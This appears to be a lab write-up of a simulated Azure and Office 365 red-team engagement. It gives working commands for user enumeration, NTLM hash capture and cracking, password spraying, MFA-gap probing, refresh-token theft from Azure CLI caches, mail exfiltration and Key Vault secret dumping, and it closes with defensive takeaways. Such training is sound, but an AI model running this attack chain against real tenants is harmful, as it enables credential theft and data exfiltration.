Get hands on with phishing, token abuse and exfiltrating data from Office 365. It provides a good overview of real-world techniques that threat actors use to compromise and move laterally and vertically in Azure, and how we can protect against these attacks.
## Learning outcomes  

- Leak Net-NTLMv2 hashes to gain user credentials
- Identify valid users and credentials using Oh365UserFinder
- Verify MFA enforcement status using MFASweep
- Perform token abuse using TokenTacticsV2
- Exfiltrate data from Azure using native tools and scripts
- Learn how this scenario can be detected and prevented
## Notes

This lab simulates a real-world red team engagement where the attack chain exploits identity and access management (IAM) vulnerabilities and social engineering to breach Mega Big Tech's environment. Here's the attack story structured for clarity:

---

### **1. Initial Reconnaissance**

- **Goal:** Identify valid users to launch phishing or password-spraying attacks.
- **Technique:**
    - Used `Oh365UserFinder` to enumerate valid email formats.
    -  Saved a list of common email formats to a text file and used the text file in the command `python3 oh365userfinder.py -r emails.txt`, confirming `firstname.lastname@megabigtech.com` as the format.
    - This highlights a common practice threat actors exploit: standardized corporate email formats.

---

### **2. Phishing Campaign**

- **Goal:** Leak Net-NTLMv2 hashes by coercing authentication to a malicious SMB server.
- **Technique:**
    - Set up a rogue SMB server with `Responder`. `python3 Responder.py -I eth0`
    - Crafted a phishing email convincing the target to authenticate to the attacker's server.
    - Successfully captured Net-NTLMv2 hashes and cracked them using `Hashcat`. `hashcat -m 5600 netntlm.hash /root/rockyou.txt`. Hashcat mode `5600` corresponds to the [Net-NTLMv2 hash type](https://hashcat.net/wiki/doku.php?id=example_hashes). The `rockyou.txt` wordlist is often used as a starting point for offline brute force attacks and contains over 14 million passwords
    - You can read more on [NTLM](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm)

---

### **3. Valid Credential Verification**

- **Goal:** Check if the compromised credentials work across corporate systems.
- **Technique:**
    - Tested the cracked credentials (`theD@RKni9ht`) against Microsoft 365 accounts. `python3 oh365userfinder.py -p theD@RKni9ht --pwspray --elist mbtusers.txt`. The `-e` parameter is just for identifying users.
    - Discovered credential reuse across systems, gaining access to the victim's corporate account.

---

### **4. Bypassing MFA**

- **Goal:** Identify services exempt from MFA enforcement.
- **Technique:**
    - Used `MFASweep` to probe MFA gaps, discovering that APIs like Microsoft Graph and Microsoft Service Management allowed single-factor authentication. `Invoke-MFASweep -Username sam.olsson@megabigtech.com -Password theD@RKni9ht -Recon`
    - Exploited these gaps to obtain a session for the Microsoft Graph API.

---

### **5. Token Abuse**

- **Goal:** Move laterally and escalate privileges using tokens. 
- **Technique:**
    - Signed into the portal as Sam and seen a logic app that had hard creds from a different user.
    - We want to see the password protection settings before doing a brute force `Install-Module Microsoft.Graph.Beta.Identity.DirectoryManagement` & `Get-MgBetaDirectorySetting |where {$_.templateId -eq "5cf42378-d67d-4f36-ba46-e8b86229381d"} |convertto-json -Depth 50`
    - Extracted refresh tokens using the Azure CLI and used them to generate new access tokens. `az account get-access-token`
    - On Mac and Linux the Az CLI access and refresh tokens are stored in plaintext in the file `~/.azure/msal_token_cache.json` . On Windows the tokens are stored in `%userprofile%\.azure\msal_token_cache.bin` , and encrypted using DPAPI. Although we could look to decrypt the tokens, we can also install an older version of the Az CLI on a test Windows VM, as these older versions store both access and refresh tokens unprotected in the file `%userprofile%\.azure\accessTokens.json`.
    - Exploited OAuth token mismanagement to pivot across services without triggering MFA.
    - Leveraged `TokenTacticsV2` to access Microsoft Graph APIs, extracting sensitive emails and credentials. `Invoke-RefreshToMSGraphToken -domain megabigtech.com -refreshToken "<token>"` token is from the json file.
    - The new access token for Microsoft Graph can be accessed with `$MSGraphToken.access_token`.

---

### **6. Privilege Escalation**

- **Goal:** Gain administrative access to the Azure environment.
- **Technique:**
    - Discovered an administrator email account with weak credentials in emails exfiltrated from Microsoft Graph.
	    - Use this Python script `wget https://raw.githubusercontent.com/rootsecdev/Azure-Red-Team/master/Tokens/exfil_exchange_mail.py`
    - Verified admin account access and discovered it was not protected by MFA.
    - Used the Azure PowerShell module to enumerate and access Azure resources, including the Azure Key Vault.
	    - `$VaultName = "MBT-Admins"`
	    - `Get-AzKeyVaultSecret -VaultName $VaultName | ForEach-Object { Get-AzKeyVaultSecret -VaultName $VaultName -Name $_.Name -asplaintext }`
    - Extracted secrets from the vault, including the global admin password, effectively owning the environment.


---

### **Defensive Takeaways**

1. **Strengthen MFA Enforcement:**
    - Ensure MFA is enforced for **all endpoints and services**, including APIs like Microsoft Graph and CLI access.
2. **Monitor Authentication Logs:**
    - Detect reconnaissance tools like `Oh365UserFinder` and brute-force attacks using logs from Entra ID.
    - KQL query `SigninLogs | where ResultType != 0 | summarize FailedLoginCount = count() by ResourceDisplayName, UserPrincipalName | sort by FailedLoginCount desc nulls last`
1. **Educate Users:**
    - Train employees to recognize phishing attempts.
2. **Limit Token Lifetimes:**
    - Implement stricter token expiration policies to reduce the window for abuse.
3. **Secure Azure Key Vaults:**
    - Use Key Vault firewall rules and RBAC to prevent unauthorized access.

https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-conditions#device-platforms

https://www.microsoft.com/en-us/security/blog/2022/11/16/token-tactics-how-to-prevent-detect-and-respond-to-cloud-token-theft/

https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0